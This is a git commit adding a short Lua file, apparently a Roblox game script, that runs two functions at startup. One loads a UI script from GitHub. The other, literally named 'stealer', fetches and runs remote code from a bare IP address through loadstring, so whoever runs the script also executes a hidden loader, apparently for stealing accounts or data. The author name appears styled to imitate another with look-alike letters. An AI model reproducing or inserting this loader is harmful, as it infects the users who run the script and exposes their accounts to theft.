7118932541706e7014c3e451bc1e20a4cde13ec5
BIudnyHoIandan <taeistnkzxx@gmail.com>
2025-08-30 19:30:39 +0500

    Create amn.lua

---
+++ primordial/script/amn.lua
@@ -0,0 +1,10 @@
+local function stealer()
+ID="0d0a40e9-48e9-45da-94c2-c75a58369eb9";
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+end
+local function loadui()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/primordial/script/amg.lua"))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
